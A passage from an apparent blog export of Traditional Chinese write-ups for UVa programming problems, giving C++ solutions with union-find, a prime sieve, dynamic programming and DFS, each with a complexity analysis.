<h2 id="程式碼"><a href="#程式碼" class="headerlink" title="程式碼"></a>程式碼</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> head[<span class="number">50005</span>],n,m,p,q,ans=<span class="number">0</span>,Case=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">bool</span> vis[<span class="number">50005</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Find</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(head[x]==x)</span><br><span class="line">		<span class="keyword">return</span> x;</span><br><span class="line">	<span class="keyword">return</span> head[x] = Find(head[x]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Union</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">	head[Find(x)] = Find(y);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m &amp;&amp; (n!=<span class="number">0</span> &amp;&amp; m!=<span class="number">0</span>))&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">50005</span> ; i++)&#123;</span><br><span class="line">			head[i]=i;</span><br><span class="line">			vis[i]=<span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		ans=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;m ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;p&gt;&gt;q;</span><br><span class="line">			Union(p,q);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>,tmp ; i&lt;=n ; i++)&#123;</span><br><span class="line">			tmp=Find(i);</span><br><span class="line">			<span class="keyword">if</span>(!vis[tmp])&#123;</span><br><span class="line">				vis[tmp]=<span class="literal">true</span>;</span><br><span class="line">				ans++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"Case "</span>&lt;&lt;Case++&lt;&lt;<span class="string">": "</span>&lt;&lt;ans&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>預處理以及輸入的時間複雜度皆約為 $O(n)$<br>每次 Union 的操作時間複雜度約為 $O(log(n))$<br>Find 的時間複雜度也約為 $O(log(n))$<br>總時間複雜度約為 $O(n + (n+m)log(n))$ ，不過實際上應該會更快</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
        <tag>Disjoint Set</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 10699</title>
    <url>/2021/03/23/UVa10699/</url>
    <content><![CDATA[<h1 id="UVa-10699"><a href="#UVa-10699" class="headerlink" title="UVa 10699"></a>UVa 10699</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?10699" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?10699</a></p>
<p>多筆輸入，每筆輸入包含一個正整數 $X$ ， 求 $X$ 有多少不同的質因數</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>先透過質數篩找到每個數的最小質因數 $p$ ，再透過不斷的除以 $p$ 直到剩下 $1$ 為止，中間除去重複的以外，剩下就是答案</p>
<h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MaxN = <span class="number">1e6</span>+<span class="number">5</span>;</span><br><span class="line"><span class="keyword">int</span> fact[MaxN];</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,cnt,p;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">long</span> <span class="keyword">long</span> i=<span class="number">2</span> ; i&lt;=MaxN ; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(!fact[i])&#123;</span><br><span class="line">			fact[i]=i;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">long</span> <span class="keyword">long</span> j=i*i ; j&lt;=MaxN ; j+=i)&#123;</span><br><span class="line">				<span class="keyword">if</span>(!fact[j])&#123;</span><br><span class="line">					fact[j]=i;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n &amp;&amp; n)&#123;</span><br><span class="line">		cnt=<span class="number">0</span>;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;n&lt;&lt;<span class="string">" : "</span>;</span><br><span class="line">		<span class="keyword">while</span>(n!=<span class="number">1</span>)&#123;</span><br><span class="line">			p=fact[n];</span><br><span class="line">			cnt++;</span><br><span class="line">			<span class="keyword">while</span>(n%p==<span class="number">0</span>)&#123;</span><br><span class="line">				n/=p;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;cnt&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h3><p>質數篩的複雜度為 $O(NloglogN)$</p>
<p>每筆測資質因數分解時間複雜度約為 $O(\Omega(X))$ 也有人說是約為 $O(logX)$</p>
<p>總時間複雜度約為 $O(NloglogN + \Omega(X))$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa10684</title>
    <url>/2020/06/23/UVa10684/</url>
    <content><![CDATA[<h1 id="UVa10684"><a href="#UVa10684" class="headerlink" title="UVa10684"></a>UVa10684</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><h2 id="想法1"><a href="#想法1" class="headerlink" title="想法1"></a>想法1</h2><p>直觀的看，暴力去找起點跟終點 $i,j$<br>複雜度$O(N^2)$</p>
<h3 id="Code1"><a href="#Code1" class="headerlink" title="Code1"></a>Code1</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,arr[<span class="number">10000</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n &amp;&amp; n)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;arr[<span class="number">1</span>];</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>,tmp ; i&lt;=n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;tmp;</span><br><span class="line">			arr[i]=arr[i<span class="number">-1</span>]+tmp;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> ans=<span class="number">-2147483647</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=n ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=i ; j&lt;=n ; j++)&#123;</span><br><span class="line">				ans=max(ans, (arr[j]-arr[i<span class="number">-1</span>]));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(ans&gt;<span class="number">0</span>)</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"The maximum winning streak is "</span>&lt;&lt;ans&lt;&lt;<span class="string">".\n"</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"Losing streak.\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>雖然說UVa上能過，但是超過1s實在太慢</p>
<h2 id="想法二"><a href="#想法二" class="headerlink" title="想法二"></a>想法二</h2><p>對於每個點來說都只有 取 跟 不取 兩種狀態，針對兩種狀態可以寫出DP式<br>定義$DP[i][j]$表示當第$i$個為取或不取時的最大值，$j=0$表不取，$j=1$表取<br>則可得</p>
<ul>
<li>$DP[i][0] = 0$</li>
<li>$DP[i][1] = max(DP[i-1][1]+arr[i], DP[i-1][0]+arr[i])$</li>
</ul>
<p>因為必須保證取的段是連續的，所以當不取時就會是0</p>
<h3 id="Code2"><a href="#Code2" class="headerlink" title="Code2"></a>Code2</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,arr[<span class="number">10005</span>],dp[<span class="number">10005</span>][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n &amp;&amp; n)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> ans=<span class="number">-2147483647</span>;</span><br><span class="line">		dp[<span class="number">0</span>][<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">		dp[<span class="number">0</span>][<span class="number">1</span>]=arr[<span class="number">0</span>];</span><br><span class="line">		ans=max(ans,dp[<span class="number">0</span>][<span class="number">1</span>]);</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			dp[i][<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">			dp[i][<span class="number">1</span>]=max(dp[i<span class="number">-1</span>][<span class="number">1</span>]+arr[i], dp[i<span class="number">-1</span>][<span class="number">0</span>]+arr[i]);</span><br><span class="line">			ans=max(ans,dp[i][<span class="number">1</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(ans&lt;=<span class="number">0</span>)</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"Losing streak.\n"</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"The maximum winning streak is "</span>&lt;&lt;ans&lt;&lt;<span class="string">".\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="想法3"><a href="#想法3" class="headerlink" title="想法3"></a>想法3</h2><p>針對想法2可以再做改良<br>可以發現到其實無論如何$DP[i][0] = 0$恆成立，所以其實沒必要存在<br>因此DP式化簡為 $DP[i]=max(DP[i-1]+arr[i],arr[i])$</p>
<h3 id="Code3"><a href="#Code3" class="headerlink" title="Code3"></a>Code3</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,arr[<span class="number">10005</span>],dp[<span class="number">10005</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n &amp;&amp; n)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> ans=max(<span class="number">-2147483647</span>,arr[<span class="number">0</span>]);</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			dp[i]=max(dp[i<span class="number">-1</span>]+arr[i],arr[i]);</span><br><span class="line">			ans=max(ans,dp[i]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(ans&lt;=<span class="number">0</span>)</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"Losing streak.\n"</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"The maximum winning streak is "</span>&lt;&lt;ans&lt;&lt;<span class="string">".\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>每次狀態轉移複雜度為 $O(1)$<br>而須轉移$n$次，總複雜度 $O(n)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>DP</tag>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa10702</title>
    <url>/2020/06/24/UVa10702/</url>
    <content><![CDATA[<h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?10702" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?10702</a></p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>從 $i$ 走到 $j$ 可以先經過 $k$<br>定義 $DP[n][i][j]$ 表示從 $i$ 走$n$步到 $j$ 的最大價值<br>轉移式: $DP[n][i][j] = max(DP[n][i][j], DP[n-1][i][k] + DP[1][k][j])$<br>且 $DP[1][i][j] = arr[i][j] (i \neq j)$<br>要記得當$i=j$時要走一步是不可能的</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code:"></a>Code:</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> c,s,e,t,arr[<span class="number">105</span>][<span class="number">105</span>],dp[<span class="number">1005</span>][<span class="number">105</span>][<span class="number">105</span>];</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; last;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">DP</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(n==<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> (i==j) ? dp[n][i][j]=<span class="number">-2147483647</span> : dp[n][i][j]=arr[i][j];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(dp[n][i][j])&#123;</span><br><span class="line">		<span class="keyword">return</span> dp[n][i][j];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">1</span> ; k&lt;=c ; k++)&#123;</span><br><span class="line">		dp[n][i][j]=max(dp[n][i][j], DP(n<span class="number">-1</span>,i,k)+DP(<span class="number">1</span>,k,j));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(dp[n][i][j])</span><br><span class="line">		<span class="keyword">return</span> dp[n][i][j];</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">-2147483647</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;c&gt;&gt;s&gt;&gt;e&gt;&gt;t &amp;&amp; c)&#123;</span><br><span class="line">		<span class="keyword">while</span>(!last.empty())last.pop_back();</span><br><span class="line">		<span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="keyword">sizeof</span>(dp));</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=c ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span> ; j&lt;=c ; j++)&#123;</span><br><span class="line">				<span class="built_in">cin</span>&gt;&gt;arr[i][j];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,tmp ; i&lt;e ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;tmp;</span><br><span class="line">			last.push_back(tmp);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">auto</span> i: last)&#123;</span><br><span class="line">			ans=max(ans,DP(t,s,i));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>共有 $tn^2$ 種狀態，每種狀態轉移複雜度為 $O(2)$<br>每筆測資複雜度為 $O(tn^2)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>DP</tag>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 10776</title>
    <url>/2021/04/27/UVa10776/</url>
    <content><![CDATA[<h1 id="UVa-10776"><a href="#UVa-10776" class="headerlink" title="UVa 10776"></a>UVa 10776</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?10776" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?10776</a></p>
<p>本題有多筆測資，每筆測資包含一個字串 $s$ 以及一個數字 $r$，求以 $s$ 為集合，所有長度為 $r$ 的字串組合，每個輸出字串由小到大排列</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>因為要求的是組合，我們可以去枚舉答案的第 $i$ 格要是什麼，並且過去枚舉過的字就不能再使用</p>
<p>為了避免重複枚舉到重複的字串，一開始要先把字串由小到大排序好</p>
<h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="built_in">string</span> s, res[<span class="number">35</span>];</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> depth, <span class="keyword">int</span> start)</span></span>&#123;</span><br><span class="line">	<span class="comment">// 枚舉完 n 個字了</span></span><br><span class="line">	<span class="keyword">if</span>(depth == n)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;res[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 第 i 個字不能重複</span></span><br><span class="line">	<span class="comment">// 用 used 紀錄用過的字</span></span><br><span class="line">	<span class="keyword">bool</span> used[<span class="number">26</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">26</span> ; i++)&#123;</span><br><span class="line">		used[i] = <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 前面娶過的字不會再被用到</span></span><br><span class="line">	<span class="comment">// 從 start 開始枚舉</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=start ; i&lt;s.size() ; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(!used[s[i]-<span class="string">'a'</span>])&#123;</span><br><span class="line">			used[s[i]-<span class="string">'a'</span>]=<span class="literal">true</span>;</span><br><span class="line">			res[depth] = s[i];</span><br><span class="line">			DFS(depth+<span class="number">1</span>, i+<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;s&gt;&gt;n)&#123;</span><br><span class="line">		sort(s.begin(), s.end());</span><br><span class="line">		DFS(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h3><p>每筆測資輸入時間複雜度為 $O(|s|)$，令 $n = |s|$</p>
<p>每筆測資排序時間複雜度為 $O(nlogn)$</p>
<p>DFS 每一層最多有 $|s|$ 種選擇，總共有 $|s|$ 層</p>
<p>每筆測資 DFS 時間複雜度為 $O(n^n)$</p>
<p>每筆測資總時間複雜度為 $O(nlogn + n^{n+1})$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>DFS</tag>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa11743</title>
    <url>/2020/07/02/UVa10812/</url>
    <content><![CDATA[<h1 id="UVa10812"><a href="#UVa10812" class="headerlink" title="UVa10812"></a>UVa10812</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?10812" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?10812</a><br>給兩隊比賽比分合與比分差的絕對值，求兩隊分數</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>假設兩隊分數分別為 $A$ $B$<br>$\frac{((A+B)+(A-B))}{2}=A$<br>則可再透過 $(A+B)-A$ 獲得 $B$<br>再檢查兩者是否合理即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> t,n,m;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">	<span class="keyword">while</span>(t--)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line">		<span class="keyword">int</span> a=(n+m)/<span class="number">2</span>;</span><br><span class="line">		<span class="keyword">int</span> b=n-a;</span><br><span class="line">		<span class="keyword">if</span>(a&lt;<span class="number">0</span> || b&lt;<span class="number">0</span> || <span class="built_in">abs</span>(a-b)!=m)</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"impossible\n"</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;a&lt;&lt;<span class="string">" "</span>&lt;&lt;b&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>$O(1)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 10957</title>
    <url>/2021/04/27/UVa10957/</url>
    <content><![CDATA[<h1 id="UVa-10957"><a href="#UVa-10957" class="headerlink" title="UVa 10957"></a>UVa 10957</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?10957" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?10957</a></p>
<p>給一個數獨的盤面，用數字 $0$ ~ $9$ 表示， $0$ 表示該格目前沒有數字</p>
<p>問這個盤面是 <strong>有唯一解</strong>、<strong>有多種解</strong>、<strong>沒有解</strong>，或是一開始的盤面即不符規則</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>對於每一個當前沒有數字的格子枚舉，把所有符合規則的盤面枚舉出來，計算可行的數量</p>
<p>至於判斷一個盤面是否合法，可以直觀的使用數獨的一般規則來判斷，也就是說</p>
<ol>
<li>一個 $3 \times 3$ 的方格當中只能有 $1$~$9$ 每個數字各一個</li>
<li>每一行方格當中只能有 $1$~$9$ 每個數字各一個</li>
<li>每一列方格當中只能有 $1$~$9$ 每個數字各一個</li>
</ol>
